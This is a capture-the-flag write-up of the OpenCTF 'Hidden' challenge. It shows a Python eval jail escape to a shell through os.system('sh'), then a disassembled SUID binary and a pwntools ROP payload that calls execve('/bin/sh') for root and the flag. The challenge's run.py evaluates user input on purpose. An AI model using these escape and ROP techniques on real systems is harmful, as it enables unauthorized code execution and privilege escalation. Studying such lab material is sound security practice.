# Hidden (100 pts)

Hidden is a pwnable with 2 solves.

> A hidden flag resides in one of the challenges... can you find it?

Ookay. Let's save that for later.
Fast forward and this notice was released:

> What is happening with Sanity Check?! For some reason it's solving math problems now... e.g.
> (1+1)

Oh. That must be Hidden. Let's revisit Sanity Check, which was a *"Hello, World!"* challenge.

```bash
$ nc challenges.openctf.cat 9005
[ASCII art]
To get the flag: `cat flag`

# cat flag
flag{a5e78d3bfed23dd8b331b2617f8a5a5d63048d68}

# ls
bash: command not found: ls
# id
bash: command not found: id
# echo
bash: command not found: echo
# cat
Traceback (most recent call last):
  File "./run.py", line 58, in <module>
    main()
  File "./run.py", line 43, in main
    if msg[1] == "flag":
IndexError: list index out of range
```

```python
$ nc challenges.openctf.cat 9005
# (1+1)
2
# (11//2)
5
# (1+sum([1,1,1]))
4
```

That `bash` is sick. Perhaps it identifies as Python...?

```python
$ nc challenges.openctf.cat 9005
# (help())

Welcome to Python 2.7!  This is the online help utility.
[...]

# (open('run.py').read())
#!/usr/bin/env python2
import re
"""
This will be a networked challenge that prints the contents of `banner.txt` and
accepts some commands. It should not apprear to be a python back-end at first.

Players will be able to `cat flag` for the sanity check flag.

If a specific regex is found, it would allow command pass-through
to a pwn challenge hosted in a suspiciously named directory in `/`.

TODO:
    Gracefully handle empty input
"""

def printBanner():
    with open('./banner.txt','r') as f:
        print f.read()

def printFlag():
    with open('./flag', 'r') as f:
        print f.read()

def printError(msg):
    print "bash: command not found: {}".format(msg[0])

def getInput():
    return str(raw_input('# ')).split()

def checkInputLen(msg):
    """Checks if input length is 0. If so, return to main"""
    if len(msg) == 0:
        main()

def main():
    """Disguise python to be bash - only allow `cat flag`"""

    msg = getInput()
    checkInputLen(msg)

    while msg[0] != 'exit':
        if msg[0] == "cat":
            if msg[1] == "flag":
                printFlag()
            else:
                print "cat: {}: No such file or directory".format(msg[1])
        else:
            try:
                cmd = re.findall('^\(.*\)$',''.join(msg))[0]
                print eval(cmd)
            except Exception as e:
                printError(msg)
        msg = getInput()
        checkInputLen(msg)

if __name__ == "__main__":
    printBanner()
    main()
```

Got 'eem.
So our input is stripped of newlines and must be surrounded by parentheses. Noproplem!

```python
# (__builtins__)
<module '__builtin__' (built-in)>
# (dir(__builtins__))
['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BufferError', 'BytesWarning', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EnvironmentError', 'Exception', 'False', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'NameError', 'None', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'ReferenceError', 'RuntimeError', 'RuntimeWarning', 'StandardError', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError', '__debug__', '__doc__', '__import__', '__name__', '__package__', 'abs', 'all', 'any', 'apply', 'basestring', 'bin', 'bool', 'buffer', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'cmp', 'coerce', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'execfile', 'exit', 'file', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'intern', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'long', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'raw_input', 'reduce', 'reload', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'unichr', 'unicode', 'vars', 'xrange', 'zip']
# (__builtins__.__import__('os'))
<module 'os' from '/usr/lib/python2.7/os.pyc'>
# (__builtins__.__import__('os').system)
<built-in function system>
# (__builtins__.__import__('os').system('sh'))
sh: 0: can't access tty; job control turned off
$
```

Shell!

```bash
$ id
uid=1000(bot) gid=1000(bot) groups=1000(bot)
$ pwd
/bot
$ ls -al
total 24
drwxr-xr-x 1 root root 4096 Aug  6 00:03 .
drwxr-xr-x 1 root root 4096 Aug 11 00:14 ..
-rw-rw-rw- 1 root root 1121 Aug  6 00:02 banner.txt
dr-xr-x--- 1 root bot  4096 Aug  6 00:03 delete-me-asap
-rw-rw-rw- 1 root root   47 Aug  6 00:02 flag
-rwxrwxrwx 1 root root 1484 Aug  6 00:02 run.py
$ ls -al delete-me-asap
total 16
dr-xr-x--- 1 root bot  4096 Aug  6 00:03 .
drwxr-xr-x 1 root root 4096 Aug  6 00:03 ..
-rwsrwxrwx 1 root root 1256 Aug  6 00:02 challenge
-r-------- 1 root root   47 Aug  6 00:02 flag

$ base64 delete-me-asap/challenge | tr -d '\n'
f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAgABAAAAAAABAAAAAAAAAAKgDAAAAAAAAAAAAAEAAOAABAEAABQAEAAEAAAAFAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAQgEAAAAAAABCAQAAAAAAAAAAIAAAAAAAAAAAAAAAAADoewAAAEiD7CRIvyEBQAAAAAAAvgkAAADoKAAAAEiNfCTovloAAADoLwAAAEi/KwFAAAAAAAC+EAAAAOgFAAAA6CwAAABIifJIif64AQAAAL8BAAAA6DwAAADDSInySIn+uAAAAAC/AAAAAOgmAAAAw7g8AAAAvwAAAADoFgAAAEiJ8kiJ/rhpAAAAvwAAAADoAQAAAMMPBcNYw1/DXsNaw0ZFRUQgTUU6IMNOT00gTk9NIE5PTS4uLgrDL2Jpbi9zaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAEAgABAAAAAAAAAAAAAAAAAAAEAAAAEAPH/AAAAAAAAAAAAAAAAAAAAAA8AAAAAAAEAxQBAAAAAAAAAAAAAAAAAABUAAAAAAAEA2wBAAAAAAAAAAAAAAAAAABoAAAAAAAEA8QBAAAAAAAAAAAAAAAAAAB8AAAAAAAEAAAFAAAAAAAAAAAAAAAAAACUAAAAAAAEAFgFAAAAAAAAAAAAAAAAAADAAAAAAAAEAGQFAAAAAAAAAAAAAAAAAADgAAAAAAAEAGwFAAAAAAAAAAAAAAAAAAEAAAAAAAAEAHQFAAAAAAAAAAAAAAAAAAEgAAAAAAAEAHwFAAAAAAAAAAAAAAAAAAFAAAAAAAAEAIQFAAAAAAAAAAAAAAAAAAFQAAAAAAAEAKwFAAAAAAAAAAAAAAAAAAFgAAAAAAAEAOwFAAAAAAAAAAAAAAAAAAGMAAAAQAAEAgABAAAAAAAAAAAAAAAAAAF4AAAAQAAEAQgFgAAAAAAAAAAAAAAAAAGoAAAAQAAEAQgFgAAAAAAAAAAAAAAAAAHEAAAAQAAEASAFgAAAAAAAAAAAAAAAAAABjaGFsbGVuZ2UuYXNtAHdyaXRlAHJlYWQAZXhpdABzZXRpZABkb19zeXNjYWxsAHNldF9yYXgAc2V0X3JkaQBzZXRfcnNpAHNldF9yZHgAYXNrAG5vbQBiaW5zaABfX2Jzc19zdGFydABfZWRhdGEAX2VuZAAALnN5bXRhYgAuc3RydGFiAC5zaHN0cnRhYgAudGV4dAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABsAAAABAAAABgAAAAAAAACAAEAAAAAAAIAAAAAAAAAAwgAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAABIAQAAAAAAAMgBAAAAAAAAAwAAAA8AAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAEAMAAAAAAAB2AAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAIYDAAAAAAAAIQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=
```

Hammer time! So that's where the pwning comes in.
It's a tiny SUID binary, and if we get code execution in its context we can read the flag owned by root.

Let's pretend we analysed the binary with `objdump`:

```nasm
$ file /tmp/challenge
/tmp/challenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
$ checksec /tmp/challenge
[*] '/tmp/challenge'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)

$ objdump -dM intel /tmp/challenge

/tmp/challenge:     file format elf64-x86-64


Disassembly of section .text:

0000000000400080 <_start>:
  400080:	e8 7b 00 00 00       	call   400100 <setid>
  400085:	48 83 ec 24          	sub    rsp,0x24
  400089:	48 bf 21 01 40 00 00 	movabs rdi,0x400121
  400090:	00 00 00 
  400093:	be 09 00 00 00       	mov    esi,0x9
  400098:	e8 28 00 00 00       	call   4000c5 <write>
  40009d:	48 8d 7c 24 e8       	lea    rdi,[rsp-0x18]
  4000a2:	be 5a 00 00 00       	mov    esi,0x5a
  4000a7:	e8 2f 00 00 00       	call   4000db <read>
  4000ac:	48 bf 2b 01 40 00 00 	movabs rdi,0x40012b
  4000b3:	00 00 00 
  4000b6:	be 10 00 00 00       	mov    esi,0x10
  4000bb:	e8 05 00 00 00       	call   4000c5 <write>
  4000c0:	e8 2c 00 00 00       	call   4000f1 <exit>

00000000004000c5 <write>:
  4000c5:	48 89 f2             	mov    rdx,rsi
  4000c8:	48 89 fe             	mov    rsi,rdi
  4000cb:	b8 01 00 00 00       	mov    eax,0x1
  4000d0:	bf 01 00 00 00       	mov    edi,0x1
  4000d5:	e8 3c 00 00 00       	call   400116 <do_syscall>
  4000da:	c3                   	ret    

00000000004000db <read>:
  4000db:	48 89 f2             	mov    rdx,rsi
  4000de:	48 89 fe             	mov    rsi,rdi
  4000e1:	b8 00 00 00 00       	mov    eax,0x0
  4000e6:	bf 00 00 00 00       	mov    edi,0x0
  4000eb:	e8 26 00 00 00       	call   400116 <do_syscall>
  4000f0:	c3                   	ret    

00000000004000f1 <exit>:
  4000f1:	b8 3c 00 00 00       	mov    eax,0x3c
  4000f6:	bf 00 00 00 00       	mov    edi,0x0
  4000fb:	e8 16 00 00 00       	call   400116 <do_syscall>

0000000000400100 <setid>:
  400100:	48 89 f2             	mov    rdx,rsi
  400103:	48 89 fe             	mov    rsi,rdi
  400106:	b8 69 00 00 00       	mov    eax,0x69
  40010b:	bf 00 00 00 00       	mov    edi,0x0
  400110:	e8 01 00 00 00       	call   400116 <do_syscall>
  400115:	c3                   	ret    

0000000000400116 <do_syscall>:
  400116:	0f 05                	syscall 
  400118:	c3                   	ret    

0000000000400119 <set_rax>:
  400119:	58                   	pop    rax
  40011a:	c3                   	ret    

000000000040011b <set_rdi>:
  40011b:	5f                   	pop    rdi
  40011c:	c3                   	ret    

000000000040011d <set_rsi>:
  40011d:	5e                   	pop    rsi
  40011e:	c3                   	ret    

000000000040011f <set_rdx>:
  40011f:	5a                   	pop    rdx
  400120:	c3                   	ret    

0000000000400121 <ask>:
  400121:	46                   	rex.RX
  400122:	45                   	rex.RB
  400123:	45                   	rex.RB
  400124:	44 20 4d 45          	and    BYTE PTR [rbp+0x45],r9b
  400128:	3a 20                	cmp    ah,BYTE PTR [rax]
  40012a:	c3                   	ret    

000000000040012b <nom>:
  40012b:	4e                   	rex.WRX
  40012c:	4f                   	rex.WRXB
  40012d:	4d 20 4e 4f          	rex.WRB and BYTE PTR [r14+0x4f],r9b
  400131:	4d 20 4e 4f          	rex.WRB and BYTE PTR [r14+0x4f],r9b
  400135:	4d                   	rex.WRB
  400136:	2e 2e 2e 0a c3       	cs cs cs or al,bl

000000000040013b <binsh>:
  40013b:	2f                   	(bad)  
  40013c:	62                   	(bad)  
  40013d:	69                   	.byte 0x69
  40013e:	6e                   	outs   dx,BYTE PTR ds:[rsi]
  40013f:	2f                   	(bad)  
  400140:	73 68                	jae    4001aa <binsh+0x6f>
```

Sweet. The binary sets UID to root for us, gives us a trivial buffer overflow in `read()`, doesn't have stack canaries etc and even hands us all the ROP gadgets we could wish for.

Time to doit.py.

```python 
#!/usr/bin/env python2
from pwn import *
from base64 import b64encode

e = ELF('./challenge')
context(arch=e.arch)
s = e.symbols

payload = 'A'*8 + flat(
    s.set_rdi, s.binsh,
    s.set_rsi, 0,
    s.set_rdx, 0,
    s.set_rax, 59,
    s.do_syscall
)

print b64encode(payload)
```

```bash
$ python doit.py SILENT
QUFBQUFBQUEbAUAAAAAAADsBQAAAAAAAHQFAAAAAAAAAAAAAAAAAAB8BQAAAAAAAAAAAAAAAAAAZAUAAAAAAADsAAAAAAAAAFgFAAAAAAAA=
```

And the d-d-d-double shell:

```bash
$ nc challenges.openctf.cat 9005
To get the flag: `cat flag`

# (dir(__builtins__.__import__('os').system('sh')))
sh: 0: can't access tty; job control turned off
$ id
uid=1000(bot) gid=1000(bot) groups=1000(bot)
$ (printf QUFBQUFBQUEbAUAAAAAAADsBQAAAAAAAHQFAAAAAAAAAAAAAAAAAAB8BQAAAAAAAAAAAAAAAAAAZAUAAAAAAADsAAAAAAAAAFgFAAAAAAAA= | base64 -d; cat) | ./delete-me-asap/challenge
FEED ME:
id
uid=0(root) gid=1000(bot) groups=1000(bot)
pwd
/bot
cat delete-me-asap/flag
flag{10c0f40a89b5daa2bdf059d0c08dc584b03129c4}
```

Sweet, sweet flag.
